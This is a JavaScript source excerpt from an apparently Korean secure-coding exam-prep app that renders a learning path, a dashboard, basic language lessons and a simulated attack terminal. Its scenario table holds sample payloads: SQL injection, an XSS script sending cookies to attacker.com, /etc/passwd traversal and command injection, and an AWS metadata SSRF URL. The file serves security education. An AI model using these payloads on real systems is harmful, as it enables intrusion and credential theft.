  {key:'basics',icon:'🧱',name:'기초 과정',desc:'Java·C·Python 보안 기초',pct:()=>gam.visited.basics?100:0,go:'basics'},
  {key:'learn',icon:'📖',name:'개념 학습',desc:'49개 보안약점 개념 익히기',pct:()=>Math.round(Object.keys(learned).length/49*100),go:'learn'},
  {key:'flash',icon:'🃏',name:'플래시카드',desc:'개념 빠른 암기·인출',pct:()=>Math.round(Object.keys(flashKnown).length/49*100),go:'flash'},
  {key:'exam',icon:'📝',name:'1교시 이론',desc:'합격선 70%+',pct:()=>examBest!=null?Math.min(100,Math.round(examBest/70*100)):0,go:'exam'},
  {key:'prac',icon:'🧪',name:'2교시 실무',desc:'정·오탐 + 서술형, 평균 70%+',pct:()=>pracBest!=null?Math.min(100,Math.round(pracBest/70*100)):0,go:'prac'},
  {key:'wrong',icon:'🔁',name:'오답 복습',desc:'SRS 간격 반복으로 약점 제거',pct:()=>wrongs.length?Math.round((wrongs.length-dueCount())/wrongs.length*100):100,go:'wrong'}
];
function rPath(){
  const done=PATH_STAGES.map(s=>s.pct()>=100);
  let nextIdx=done.findIndex(d=>!d);if(nextIdx<0)nextIdx=PATH_STAGES.length-1;
  const overall=Math.round(PATH_STAGES.reduce((a,s)=>a+s.pct(),0)/PATH_STAGES.length);
  const items=PATH_STAGES.map((s,i)=>{const p=s.pct(),cur=i===nextIdx;
    return '<div class="pstage'+(p>=100?' done':'')+(cur?' cur':'')+'"><div class="ps-line"><span class="ps-icon">'+(p>=100?'✅':s.icon)+'</span>'+(i<PATH_STAGES.length-1?'<span class="ps-conn"></span>':'')+'</div>'+
      '<div class="ps-body"><div class="ps-h">'+esc(s.name)+(cur?' <span class="ps-now">지금 여기</span>':'')+'</div><div class="ps-d">'+esc(s.desc)+'</div>'+
      '<div class="ps-bar"><i style="width:'+p+'%"></i></div><div class="ps-pct">'+p+'%</div>'+
      '<button class="btn ghost ps-go" onclick="tab(\''+s.go+'\')">이동 →</button></div></div>';}).join('');
  document.getElementById('v-path').innerHTML='<h2 class="st">🗺️ 학습 경로</h2><p class="sub">진단원 준비를 위한 권장 학습 순서입니다. 전체 진행률 <b>'+overall+'%</b>.</p>'+
    gamHeaderHtml()+
    '<div class="rec-cta">다음 추천 단계: <b>'+PATH_STAGES[nextIdx].icon+' '+esc(PATH_STAGES[nextIdx].name)+'</b><button class="qbtn" onclick="tab(\''+PATH_STAGES[nextIdx].go+'\')">바로 시작 →</button></div>'+
    '<div class="path-list">'+items+'</div>';
}

function esc(s){const d=document.createElement('div');d.textContent=s==null?'':s;return d.innerHTML;}
function gnorm(s){return (s||'').toString().toLowerCase().replace(/[\s.,;:!?()\[\]{}"'`]/g,'');}
// 코드 주석 제거(검증 연극 차단): 주석 속 키워드로 만점받는 우회를 막는다.
// URL의 '://' 와 정규식/문자열 속 '#' 는 보존(오탐 방지)하기 위해 보수적으로 제거한다.
function stripCode(s){return (s||'').toString()
  .replace(/\/\*[\s\S]*?\*\//g,' ')      // 블록 주석 /* */
  .replace(/([^:])\/\/[^\n]*/g,'$1 ')    // 인라인 // 주석 (단, URL의 :// 는 보존)
  .replace(/^[ \t]*\/\/[^\n]*/gm,' ')    // 줄 시작 // 주석
  .replace(/^[ \t]*#[^\n]*/gm,' ');}     // 줄 시작 # 주석 (정규식/문자열 속 # 는 보존)
// ── tree-sitter AST 정밀 전처리 (무료·클라이언트, 실패 시 정규식 stripCode로 자동 폴백) ──
const TSLANG={'Java':'java','C':'c','Python':'python'};
let tsCore=null, tsParser={}, tsLoadP={};
function loadTreeSitter(lang){
  const L=TSLANG[lang]; if(!L) return Promise.resolve(false);
  if(tsParser[L]) return Promise.resolve(true);
  if(tsLoadP[L]) return tsLoadP[L];
  tsLoadP[L]=(async()=>{
    const CDN='https://cdn.jsdelivr.net/npm/web-tree-sitter@0.22.6';
    if(!tsCore){
      await new Promise((res,rej)=>{const s=document.createElement('script');s.src=CDN+'/tree-sitter.js';s.onload=res;s.onerror=rej;document.head.appendChild(s);});
      const TS=window.TreeSitter||window.Parser;
      await TS.init({locateFile:()=>CDN+'/tree-sitter.wasm'});
      tsCore=TS;
    }
    const grammar=await tsCore.Language.load('https://cdn.jsdelivr.net/npm/tree-sitter-wasms@0.1.11/out/tree-sitter-'+L+'.wasm');
    const p=new tsCore(); p.setLanguage(grammar); tsParser[L]=p; return true;
  })().catch(()=>false);
  return tsLoadP[L];
}
function astReady(lang){return !!tsParser[TSLANG[lang]];}
// AST로 주석을 정확히 제거(문자열 속 //·# 오탐 없음). 미로딩/실패 시 정규식 폴백.
function cleanCode(code, lang){
  const L=TSLANG[lang];
  try{
    if(L && tsParser[L]){
      const tree=tsParser[L].parse(code||''); let src=code||''; const cuts=[];
      (function walk(n){const t=n.type;if(t==='comment'||t==='line_comment'||t==='block_comment'){cuts.push([n.startIndex,n.endIndex]);}for(let i=0;i<n.childCount;i++)walk(n.child(i));})(tree.rootNode);
      cuts.sort((a,b)=>b[0]-a[0]).forEach(c=>{src=src.slice(0,c[0])+' '.repeat(c[1]-c[0])+src.slice(c[1]);});
      return src;
    }
  }catch(e){}
  return stripCode(code);
}
function kwHit(t,k){const g=gnorm(k);return !!g&&gnorm(t).includes(g);}  // 빈 정규화 키워드(구두점만)는 항상매치 방지
function kwScore(t,kws,max){if(!kws||!kws.length)return 0;const h=kws.filter(k=>kwHit(t,k)).length;return Math.round(h/kws.length*max);}
function shuffle(a){a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
function diffBadge(d){const c={'하':['#dcfce7','#15803d'],'중':['#fef9c3','#a16207'],'상':['#fee2e2','#b91c1c']}[d]||['#eef2ff','#4338ca'];return '<span style="display:inline-block;font-size:11px;font-weight:700;border-radius:6px;padding:2px 9px;font-family:JetBrains Mono,monospace;background:'+c[0]+';color:'+c[1]+'">난이도 '+d+'</span>';}
// 취약 코드 → 안전 코드 라인 단위 diff (LCS)
function lineDiff(a,b){const A=(a||'').split('\n'),B=(b||'').split('\n'),n=A.length,m=B.length;
  const dp=Array.from({length:n+1},()=>new Array(m+1).fill(0));
  for(let i=n-1;i>=0;i--)for(let j=m-1;j>=0;j--)dp[i][j]=A[i]===B[j]?dp[i+1][j+1]+1:Math.max(dp[i+1][j],dp[i][j+1]);
  let i=0,j=0;const out=[];
  while(i<n&&j<m){if(A[i]===B[j]){out.push(['ctx',A[i]]);i++;j++;}else if(dp[i+1][j]>=dp[i][j+1]){out.push(['del',A[i]]);i++;}else{out.push(['add',B[j]]);j++;}}
  while(i<n){out.push(['del',A[i]]);i++;}while(j<m){out.push(['add',B[j]]);j++;}
  return out;}
function diffHtml(a,b){return lineDiff(a,b).map(p=>{const s=p[0]==='del'?'- ':p[0]==='add'?'+ ':'  ';return '<span class="d-'+p[0]+'">'+esc(s+p[1])+'</span>';}).join('\n');}

document.getElementById('kisa49').innerHTML = KISA49.map(n=>'<option value="'+esc(n)+'">').join('');

function tab(v){
  document.querySelectorAll('.tab').forEach(t=>{const on=t.dataset.v===v;t.classList.toggle('on',on);t.setAttribute('aria-selected',on?'true':'false');});
  document.querySelectorAll('.view').forEach(x=>x.classList.remove('on'));
  document.getElementById('v-'+v).classList.add('on');window.scrollTo(0,0);
  gam.visited[v]=true;save('gam',gam);
  ({dash:rDash,path:rPath,basics:rBasics,learn:rLearn,flash:rFlash,exam:rExam,prac:rPrac,design:rDesign,ide:rIDE,wrong:rWrong,saas:rSaas}[v])();
}
// 스크린리더 알림(aria-live)
function announce(msg){const el=document.getElementById('ariaLive');if(!el)return;el.textContent='';setTimeout(()=>{el.textContent=msg;},40);}

// ===== 대시보드 =====
function rDash(){
  const ln=Object.keys(learned).length,fk=Object.keys(flashKnown).length;
  const tpCov=new Set(PRACTICAL.filter(p=>p.isTruePositive).map(p=>p.weaknessName)).size;
  let rows='';
  CATS.forEach(c=>{const tot=CONCEPTS.filter(x=>x.cat===c).length,dn=CONCEPTS.filter(x=>x.cat===c&&learned[x.name]).length,pct=Math.round(dn/tot*100);
    rows+='<div class="prow"><div class="nm">'+c+'</div><div class="bar"><i style="width:'+pct+'%;background:'+CCOLOR[c]+'"></i></div><div class="vv">'+dn+'/'+tot+'</div></div>';});
  document.getElementById('v-dash').innerHTML=
   '<h2 class="st">📊 나의 학습 현황</h2><p class="sub">진도·기록은 이 브라우저에 자동 저장됩니다.</p>'+
   '<div id="gamHeader">'+gamHeaderHtml()+'</div>'+
   '<div class="dgrid">'+dc(ln+'/49','개념 학습')+dc(fk+'/49','플래시 숙련')+dc(examBest!=null?examBest+'%':'-','1교시 최고점')+dc(pracBest!=null?pracBest+'%':'-','2교시 최고점')+dc(tpCov+'/49','실무 출제 약점')+dc(wrongs.length,'오답노트')+dc(dueCount(),'오늘 복습')+'</div>'+
   topWeakHtml()+
   '<div class="prog-wrap"><h3>유형별 개념 학습 숙련도</h3>'+rows+'</div>'+
   '<div class="quick"><button class="qbtn" onclick="tab(\'path\')">🗺️ 학습 경로</button><button class="qbtn ghost" onclick="tab(\'basics\')">🧱 기초 과정</button><button class="qbtn ghost" onclick="tab(\'learn\')">📖 개념 학습</button><button class="qbtn ghost" onclick="tab(\'flash\')">🃏 플래시카드</button><button class="qbtn ghost" onclick="tab(\'exam\')">📝 1교시 이론</button><button class="qbtn ghost" onclick="tab(\'prac\')">🧪 2교시 실무</button></div>'+
   heatmapHtml()+
   badgesHtml()+
   toolsHtml()+
   '<button class="reset" onclick="resetAll()">↺ 학습 기록 초기화</button>';
}
function dc(b,s){return '<div class="dcard"><b>'+b+'</b><span>'+s+'</span></div>';}
function resetAll(){if(confirm('모든 학습 기록을 초기화할까요?')){['learned','flash','wrong','examBest','pracBest','wrongStats','gam'].forEach(k=>localStorage.removeItem(NS+k));learned={};flashKnown={};wrongs=[];examBest=null;pracBest=null;wrongStats={};gam={xp:0,streak:0,bestStreak:0,lastActive:'',days:{},badges:{},claimed:{},graduates:0,visited:{}};rDash();}}
// 상용 SAST 도구 비교 + 포털 위치(정직)
function toolsHtml(){
  const rows=TOOLS.tools.map(t=>'<tr'+(/LASHR/.test(t.name)?' class="ours"':'')+'><td><b>'+esc(t.name)+'</b><br><span class="tv">'+esc(t.vendor)+'</span></td><td>'+esc(t.license)+'</td><td>'+esc(t.method)+'</td><td>'+esc(t.strong)+'</td><td>'+esc(t.limit)+'</td></tr>').join('');
  return '<div class="toolscmp"><h3>🛠️ 상용 SAST 도구 비교 — 이 포털의 위치</h3><div class="tpos">'+TOOLS.position+'</div>'+
    '<div class="ttbl-wrap"><table class="ttbl"><thead><tr><th>도구</th><th>라이선스</th><th>분석 방식</th><th>강점</th><th>한계</th></tr></thead><tbody>'+rows+'</tbody></table></div></div>';
}

// ===== 기초 과정 (Java·C·Python) =====
const BLANGC={'Java':'#b07219','C':'#555555','Python':'#3572A5'};
let basicLang='Java';
let basicIntervals={};

function getBasicSteps(lang, topic, code) {
  const lines = code.split('\n');
  const stepsMap = {
    'Java_변수와 자료형': [
      '30을 담은 4바이트 정수 변수 age 선언',
      '큰 숫자를 다루기 위한 8바이트 long 변수 big 선언',
      '소수점 아래 값을 가지는 double 실수 변수 rate 선언',
      '논리값 true를 저장하는 boolean 변수 ok 선언',
      '문자열 객체 name 선언 및 홍길동 저장',
      '🔍 [보안 진단]: 정수형 한계를 넘거나 잘못된 자료형 변환 시 프로그램이 에러를 일으킵니다.'
    ],
    'Java_제어문과 반복': [
      '사용자의 admin 권한 체크 분기 시작',
      '권한이 통과되면 grantAccess() 호출',
      '권한이 없으면 denyAccess() 호출 (안전한 접근 차단)',
      '목록 개수만큼 반복문 시작',
      '각 항목을 하나씩 순회하며 안전한 비즈니스 처리 수행',
      '🔍 [보안 진단]: 이 분기문이 클라이언트가 아닌 서버 측에서 완전히 검증되는지 확인하는 것이 핵심입니다.'
    ],
    'Java_메소드': [
      '외부 입력 두 정수를 가산하는 public 메소드 선언',
      'a와 b의 합을 안전하게 반환',
      '중요 비밀 키 목록을 반환하는 private 메소드 선언',
      '내부 private 배열의 참조를 그대로 반환 (보안 위배: 참조 노출!)',
      '🔍 [보안 진단]: private 배열을 복사본 복사 없이 직접 반환하면 외부에서 악의적으로 변형할 수 있습니다.'
    ],
    'Java_클래스와 객체': [
      'Account 클래스 및 멤버 정의',
      '계좌 잔액 필드를 private으로 선언하여 외부 직접 접근 및 악성 변조 차단',
      '돈을 입금하는 public 검증 메소드 선언',
      '입금액이 0보다 큰 양수인 경우에만 안전하게 잔액 반영',
      '🔍 [보안 진단]: 중요 변수는 private으로 감싸고, 오직 안전하게 검증된 setter 메소드로만 조작하도록 합니다.'
    ],
    'Java_예외 처리': [
      '커넥션 자원 획득 및 사용 시도',
      '커넥션 열기 수행',
      '획득된 자원을 통한 비즈니스 로직 수행',
      'IOException 발생 시 에러 로그 기록 (민감 스택트레이스 유출 방지)',
      'finally 블록 진입 (예외가 나도 무조건 실행)',
      '안전하게 커넥션 닫기 (메모리 및 자원 누수 차단)',
      '🔍 [보안 진단]: 자원 해제를 생략하면 연결 고갈로 서버가 마비되며, 에러 상세가 유출되면 해킹 단서가 됩니다.'
    ],
    'Java_외부 입력과 DB 접근': [
      '클라이언트 웹 요청 파라미터 id 수집 (신뢰 불가 입력값)',
      'PreparedStatement 바인딩 SQL 준비 (? 매개변수 바인딩 사용)',
      '첫 번째 파라미터 ? 에 id 문자열 세팅 (SQL 쿼리 파싱 차단)',
      '쿼리 안전 실행',
      '🔍 [보안 진단]: 쿼리 문자열과 파라미터를 분리하지 않고 더하기(+) 연산자로 결합하면 쿼리가 깨지면서 SQL injection을 당합니다.'
    ],
    'Java_멀티스레드와 동기화': [
      'synchronized 키워드를 사용해 한 번에 하나의 스레드만 실행하도록 보장',
      '잔액(balance)이 출금 요청액 이상인지 검사 (동시 요청 시 중복 출금 방지)',
      '잔액에서 출금액 차감',
      '🔍 [보안 진단]: 멀티스레드 환경에서 동기화가 없으면 잔액이 10만원인데 동시에 10만원씩 2번 요청할 때 둘 다 출금되는 사고가 터집니다.'
    ],
    'C_변수와 자료형': [
      '정수 변수 count를 0으로 선언 및 안전하게 초기화',
      '문자 변수 grade 선언 및 A 할당',
      'long형 변수 total 선언 및 0 할당',
      '부호 없는 unsigned int 변수 선언',
      '🔍 [보안 진단]: C언어에서 변수를 초기화하지 않으면 메모리에 남아있던 쓰레기 값이 주입되어 오동작의 불씨가 됩니다.'
    ],
    'C_포인터': [
      '정수 변수 x 선언 및 10 대입',
      '포인터 변수 p에 x의 메모리 주소(&x) 할당',
      'p를 역참조(*p)하여 x의 실제 값 10을 메모리에서 로드 및 출력',
      '포인터가 가리키는 주소가 유효한지 NULL 검사 수행',
      '안전하게 주소값 역참조하여 값을 20으로 변환',
      '🔍 [보안 진단]: 검증되지 않은 잘못된 메모리 주소(NULL 등)를 역참조하면 하드웨어 폴트가 나서 프로그램이 즉사합니다.'
    ],
    'C_배열과 문자열': [
      '크기가 16바이트인 캐릭터 배열 buf 선언',
      'strncpy를 이용해 대상 크기(sizeof-1)만큼만 안전 복사',
      '배열의 마지막 칸에 널 문자(\\0) 강제 종결 처리',
      '🔍 [보안 진단]: strcpy는 문자열 길이를 따지지 않아 버퍼 바깥 메모리를 덮어쓰고, 이것이 권한 탈취로 귀결됩니다.'
    ],
    'C_동적 메모리': [
      'malloc을 통해 BUFFER_SIZE 만큼의 힙 메모리 공간 확보',
      '메모리가 정상 할당되었는지 NULL 여부 검사',
      '메모리 크기 한도 내에서 안전하게 문자열 복사',
      '사용이 끝난 메모리 자원 free로 해제',
      '포인터 변수에 NULL을 대입하여 해제된 자원을 다시 접근하는 UAF(Use After Free) 차단',
      '🔍 [보안 진단]: 해제하지 않은 동적 메모리는 서버 다운을 유발하고, 해제 후 재사용은 임의 코드 실행으로 번집니다.'
    ],
    'C_함수와 재귀': [
      '팩토리얼 재귀 함수 정의',
      '재귀 탈출을 위한 종료 조건(기저 사례 n <= 1) 평가',
      'n이 클 경우 자기 자신을 다시 호출하여 다음 재귀 수행',
      '🔍 [보안 진단]: 탈출 루프 조건이 어긋나면 무한 루프에 돌며 스택 프레임이 마구 누적되다 스택 오버플로우로 꺼집니다.'
    ],
    'C_표준 입출력과 위험 함수': [
      '100바이트 문자배열 str 정의',
      'fgets 함수를 통해 지정된 버퍼 크기 내에서만 표준입력 수신',
      '🔍 [보안 진단]: gets() 함수는 입력 데이터 한계 제어가 아예 불가능하므로 절대로 상용 소스코드에 써서는 안 됩니다.'
    ],
    'Python_변수와 자료형': [
      '변수 age에 int형 30 바인딩',
      '변수 rate에 float형 0.75 바인딩',
      '변수 name에 str형 홍길동 바인딩',
      '변수 ok에 bool형 True 바인딩',
      '변수 items에 list형 [1, 2, 3] 바인딩',
      '🔍 [보안 진단]: 파이썬은 실행 시 타입이 정해지므로, 외부 입력이 엉뚱한 타입으로 유입 시 예외 크래시를 방지하기 위해 타입 검증이 중요합니다.'
    ],
    'Python_제어문과 함수': [
      '비밀번호 유효성을 확인하는 check_password 함수 정의',
      '정규표현식 모듈 로드',
      '영문+숫자 혼합 8자리 이상 유효성 정규식 준비',
      '입력받은 pw가 규칙에 맞는지 대조한 결과를 불리언으로 반환',
      '사용자 비밀번호 검증 결과 분기',
      '검증 통과 시 가입 처리 진행',
      '🔍 [보안 진단]: 유효하지 않고 취약한 패스워드는 무차별 대입 및 대입 크리덴셜 해킹에 쉽게 털리게 됩니다.'
    ],
    'Python_자료구조(list·dict·set)': [
      '안전한 서버 도메인을 보관하는 set 허용목록 정의',
      '사용자가 건넨 URL에서 hostname 파트만 안전하게 추출',
      '추출한 host가 ALLOWED_HOSTS 목록에 등록되어 있는지 화이트리스트 검사',
      '불허된 도메인은 에러 발생시켜 차단',
      '🔍 [보안 진단]: 블랙리스트 필터링(..이나 로컬호스트 필터)은 우회법이 많습니다. 화이트리스트 도메인 제한이 정석입니다.'
    ],
    'Python_모듈과 예외': [
      '수치 변환 예외 감시 영역 시작',
      '문자열에서 공백 제거 후 정수로 파싱 시도',
      'ValueError 예외 발생 시 전용 에러 메시지 안내',
      'FileNotFoundError 발생 시 파일 없음을 알림',
      '🔍 [보안 진단]: except Exception: 과 같이 광범위하게 모든 오류를 삼켜버리면 원인 디버깅이 차단되고 예기치 못한 상태로 계속 실행됩니다.'
    ],
    'Python_외부 명령과 위험 함수': [
      'ast 모듈과 subprocess 모듈 로드',
      'ast.literal_eval을 사용해 악성 파이썬 실행 없이 안전하게 파이썬 리터럴 데이터 파싱',
      '리스트 인자 형식으로 셸 해석기 없이 안전하게 ping 명령어 실행',
      '🔍 [보안 진단]: eval()이나 os.system()을 쓰면 사용자가 명령어 뒤에 세미콜론(;)을 붙여 서버 통제권을 강취할 수 있습니다.'
    ],
    'Python_직렬화와 암호': [
      'json과 bcrypt 모듈 로드',
      'pickle 대신 안전하게 구조화 데이터만 파싱하는 json.loads 사용',
      '솔트(Salt)를 자동 생성하고 강력한 해싱으로 비밀번호 단방향 암호화 수행',
      '🔍 [보안 진단]: pickle은 악성코드가 담긴 객체 복원 시 강제 코드를 실행하고, 솔트 없는 해시는 레인보우 테이블로 해독됩니다.'
    ],
    'Python_웹 요청과 SSRF 방어': [
      'requests 및 urlparse 모듈 로드',
      '클라이언트 웹 매개변수로 입력받은 url 수집 (신뢰 불가)',
      'url에서 호스트네임 파트 추출',
      '화이트리스트 기반의 허용된 외부 호스트인지 검사',
      '검증된 안전한 URL에 대해서만 외부 HTTP 요청 전송',
      '🔍 [보안 진단]: URL 검증 없이 외부 요청을 실행하면 공격자가 내부 127.0.0.1 포트를 스캔하거나 AWS 메타데이터를 유출합니다.'
    ]
  };

  const key = `${lang}_${topic}`;
  const customSteps = stepsMap[key];
  if (customSteps) {
    return lines.map((line, idx) => ({
      line: line,
      comment: customSteps[idx] || '코드를 분석 실행합니다.'
    })).concat(customSteps.length > lines.length ? [{
      line: '🛡️ [보안 진단 핵심 가이드라인]',
      comment: customSteps[customSteps.length - 1]
    }] : []);
  }
  return lines.map((line, idx) => ({
    line: line,
    comment: `${idx + 1}번째 행을 분석 실행합니다.`
  }));
}

function runBasicVisualizer(bi) {
  if (basicIntervals[bi]) {
    clearInterval(basicIntervals[bi]);
  }
  
  const container = document.getElementById('bdbg-wrap-' + bi);
  if (!container) return;
  
  const list = BASICS.filter(b => b.lang === basicLang);
  const item = list[bi];
  if (!item) return;
  
  const steps = getBasicSteps(item.lang, item.topic, item.code);
  
  container.innerHTML = `
    <div class="basic-dbg-panel">
      <div class="basic-dbg-header">
        <span>⚡ Code Flow Visual Debugger</span>
        <span style="font-size:10px; color:#64748b;" id="bdbg-status-${bi}">Analyzing...</span>
      </div>
      <div id="bdbg-steps-list-${bi}"></div>
    </div>
  `;
  
  const stepsList = document.getElementById('bdbg-steps-list-' + bi);
  const statusSpan = document.getElementById('bdbg-status-' + bi);
  const preElement = document.getElementById('bcode-' + bi);
  
  if (preElement) {
    preElement.classList.add('active-line-highlight');
  }

  let stepIdx = 0;
  function showNextStep() {
    if (stepIdx >= steps.length) {
      clearInterval(basicIntervals[bi]);
      statusSpan.textContent = "Analysis Complete ✅";
      statusSpan.style.color = "#10b981";
      if (preElement) {
        preElement.classList.remove('active-line-highlight');
      }
      return;
    }
    
    const step = steps[stepIdx];
    statusSpan.textContent = `Running line ${stepIdx + 1}/${steps.length - 1}...`;
    
    const stepEl = document.createElement('div');
    stepEl.className = 'basic-dbg-step';
    
    const isWarning = step.line.includes('보안 진단') || step.line.includes('🛡️');
    const color = isWarning ? '#f59e0b' : '#38bdf8';
    const bg = isWarning ? 'rgba(245,158,11,0.06)' : 'transparent';
    const border = isWarning ? '1px dashed rgba(245,158,11,0.2)' : 'none';
    
    stepEl.style.background = bg;
    stepEl.style.border = border;
    stepEl.style.padding = isWarning ? '6px 8px' : '2px';
    stepEl.style.borderRadius = '6px';
    stepEl.style.marginTop = isWarning ? '8px' : '2px';
    
    stepEl.innerHTML = `
      <span style="color:${color}; font-weight:700;">▶</span>
      <div>
        <div style="font-family:'JetBrains Mono',monospace; color:${isWarning?'#f59e0b':'#e2e8f0'}; font-size:11.5px;">${esc(step.line)}</div>
        <div class="basic-dbg-desc" style="border-left-color:${color};">${esc(step.comment)}</div>
      </div>
    `;
    
    stepsList.appendChild(stepEl);
    
    const dbgPanel = container.querySelector('.basic-dbg-panel');
    if (dbgPanel) {
      dbgPanel.scrollTop = dbgPanel.scrollHeight;
    }
    
    stepIdx++;
  }
  
  showNextStep();
  basicIntervals[bi] = setInterval(showNextStep, 1000);
}

function rBasics(){
  awardXp(5,'기초 과정 시작','visit:basics');
  const langs=['Java','C','Python'];
  const chips=langs.map(l=>'<button class="cchip'+(l===basicLang?' on':'')+'" onclick="setBasicLang(\''+l+'\')">'+l+' '+BASICS.filter(b=>b.lang===l).length+'</button>').join('');
  const list=BASICS.filter(b=>b.lang===basicLang);
  const cards=list.map((b, bi)=> {
    return '<div class="bcard"><div class="bh"><span class="blang" style="background:'+(BLANGC[b.lang]||'#666')+'">'+esc(b.lang)+'</span><h4>'+esc(b.topic)+'</h4></div>'+
      '<div class="btx">'+esc(b.desc)+'</div>'+
      '<pre class="cpre" id="bcode-'+bi+'">'+esc(b.code)+'</pre>'+
      '<div class="bsec"><b>🛡️ 진단과의 연결</b> '+esc(b.sec)+'</div>'+
      '<div class="basic-dbg-wrapper" id="bdbg-wrap-'+bi+'"></div>'+
      '<button class="qbtn ghost" style="padding:6px 12px; font-size:12px; margin-top:10px; display:inline-flex; align-items:center; gap:6px; width:100%; justify-content:center;" onclick="runBasicVisualizer('+bi+')">'+
        '🔍 코드 실행 흐름 시각화'+
      '</button></div>';
  }).join('');
  document.getElementById('v-basics').innerHTML='<h2 class="st">🧱 기초 과정 — Java · C · Python (20대 개발보안 기본과정)</h2><p class="sub">정·오탐을 판별하려면 먼저 언어 기본기가 필요합니다. 각 주제는 <b>개념 → 예제 코드 → 진단과의 연결</b> 및 <b>코드 실행 흐름 시뮬레이션</b>으로 구성됩니다.</p><div class="catbar">'+chips+'</div><div class="bgrid">'+cards+'</div>';
}

function setBasicLang(l){
  // Clear any running intervals
  Object.keys(basicIntervals).forEach(k => {
    clearInterval(basicIntervals[k]);
  });
  basicIntervals = {};
  basicLang=l;
  rBasics();
}

// ===== 개념학습 (💥 공격 시나리오 매핑 및 터미널 시뮬레이션 고도화) =====
function getScenario(cwe, name) {
  const scenarios = {
    'CWE-89': {
      scenario: '공격자가 로그인 폼의 아이디 필드에 SQL 구문을 삽입하여 비밀번호 검증을 우회하고 최고 관리자(admin) 계정으로 인증을 무단 우회합니다.',
      payload: "admin' OR '1'='1"
    },
    'CWE-79': {
      scenario: '공격자가 게시판 글 작성 시 악성 자바스크립트를 삽입하여, 해당 글을 읽는 일반 사용자들의 세션 쿠키(sessionid)를 탈취해 계정을 도용합니다.',
      payload: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)<\/script>"
    },
    'CWE-22': {
      scenario: '공격자가 파일 다운로드 API의 매개변수를 조작하여 웹루트를 탈출하고 리눅스 시스템의 민감한 설정 파일(/etc/passwd)을 원격에서 열람합니다.',
      payload: "../../../../../etc/passwd"
    },
    'CWE-78': {
      scenario: '공격자가 시스템 네트워크 진단 도구(ping) 페이지의 입력값에 세미콜론(;)을 추가하여 웹 서버 권한으로 임의의 시스템 명령어를 강제 실행합니다.',
      payload: "127.0.0.1; cat /etc/passwd"
    },
    'CWE-434': {
      scenario: '공격자가 프로필 이미지 업로드 기능에 확장자 검증 우회를 적용해 웹셸(JSP/PHP) 파일을 서버에 업로드하고 원격 코드 실행(RCE) 권한을 획득합니다.',
      payload: "webshell.jsp (Content-Type: application/octet-stream)"
    },
    'CWE-601': {
      scenario: '로그인 완료 후 특정 페이지로 리다이렉트하는 매개변수를 외부 사이트로 변조하여 사용자를 피싱 사이트로 강제 자동 연결시켜 로그인 정보를 재입력하게 유도합니다.',
      payload: "redirect_url=http://phishing-kisa.secure/login"
    },
    'CWE-352': {
      scenario: '공격자가 조작된 이미지 태그가 포함된 이메일 또는 게시글을 업로드하고, 관리자가 이 글을 읽는 순간 브라우저가 관리자 비밀번호 변경 API를 무단 요청하도록 강제합니다.',
      payload: "<img src='http://bank.com/api/change_pw?new_pw=attack123' width='0' height='0'>"
    },
    'CWE-918': {
      scenario: '웹 서비스가 외부 이미지를 다운로드하는 기능을 악용하여, 공격자가 로컬호스트(127.0.0.1) 또는 사내 클라우드 메타데이터 API 서버를 타겟으로 지정해 내부 민감 기밀을 반환시킵니다.',
      payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    },
    'CWE-798': {
      scenario: '개발 단계에서 편의를 위해 소스코드 내에 데이터베이스 암호나 API 인증 키를 문자열 상수로 직접 박아두었으나, 소스코드 저장소가 노출되어 외부 공격자에게 클라우드 통제권이 탈취됩니다.',
      payload: "const AWS_SECRET_ACCESS_KEY = 'AKIAIOSFODNN7EXAMPLE'"
    },
    'CWE-327': {
      scenario: '암호학적으로 안전하지 않고 충돌 쌍 탐지가 완료된 해시 알고리즘(MD5, SHA-1)을 사용해 비밀번호를 암호화하여 데이터 유출 시 무차별 대입(Rainbow Table) 공격으로 평문이 고스란히 복원됩니다.',
      payload: "MD5('password123') = 48503dfd58720bd5ff35c102065a52d7"
    },
    'CWE-502': {
      scenario: '사용자가 전송한 직렬화 데이터(Java Object 등)를 검증 없이 역직렬화하여, 직렬화 스트림 가공을 통해 서버 상에서 임의의 클래스가 강제 로드되고 원격 코드 실행으로 이어집니다.',
      payload: "AC ED 00 05 73 72 00 11 (Java Serialized Magic Header)"
    },
    'CWE-120': {
      scenario: 'C언어의 strcpy 등 경계 검사를 수행하지 않는 함수를 사용하여, 입력받는 버퍼보다 훨씬 큰 값을 넣어 인접 메모리의 반환 주소(Return Address) 영역을 악성 코드 주소로 덮어씌워 셸 코드를 획득합니다.',
      payload: "char buf[64]; strcpy(buf, 'A' * 128 + Shellcode)"
    },
    'CWE-367': {
      scenario: '파일 업로드 검사 로직(검사 시점)과 실제 임시 폴더에서 실행 폴더로 파일을 이동시키는 시점(사용 시점) 사이의 미세한 시간차를 이용해, 악성 파일을 재빠르게 덮어써서 실행 권한을 우회 획득합니다.',
      payload: "Symlink Race / TOCTOU Attack Window Exploitation"
    }
  };
  if (scenarios[cwe]) return scenarios[cwe];
  return {
    scenario: '공격자가 ' + name + ' 약점이 존재하는 대상 시스템을 타겟으로 비정상 제어 신호나 변조된 매개변수를 인입시켜 비인가 접근 권한 또는 민감 정보 탈취를 수행합니다.',
    payload: '[Attack Payload: CWE-' + (cwe ? cwe.replace(/\D/g, '') : 'Unknown') + ' Input Vector]'
  };
}

function runConceptSimulation(event, gi, cwe, name) {
  if (event && event.stopPropagation) event.stopPropagation();
  const term = document.getElementById('sim-term-' + gi);
  if (!term) return;
  
  const data = getScenario(cwe, name);
  term.classList.add('active');
  term.innerHTML = '';
  
  const steps = [
    { text: `[1/3] 🎯 Target endpoint identified for KISA-${cwe.replace(/\D/g, '')}.`, delay: 0 },
    { text: `[2/3] 📤 Sending exploit payload: ${data.payload}`, delay: 600 },
    { text: `[3/3] 💥 Vulnerability triggered successfully (Simulated Threat Active).`, delay: 1300 },
    { text: `\n[EXPLOIT IMPACT] -> ${data.scenario}`, delay: 1800 }
  ];
  
  steps.forEach(step => {
    setTimeout(() => {
      term.innerHTML += step.text + '\n';
      term.scrollTop = term.scrollHeight;
    }, step.delay);
  });
}

let learnCat='전체';
function rLearn(){
  const chips=['전체',...CATS].map(c=>'<button class="cchip'+(c===learnCat?' on':'')+'" onclick="setLearnCat(\''+c+'\')">'+c+(c==='전체'?'':' '+CONCEPTS.filter(x=>x.cat===c).length)+'</button>').join('');
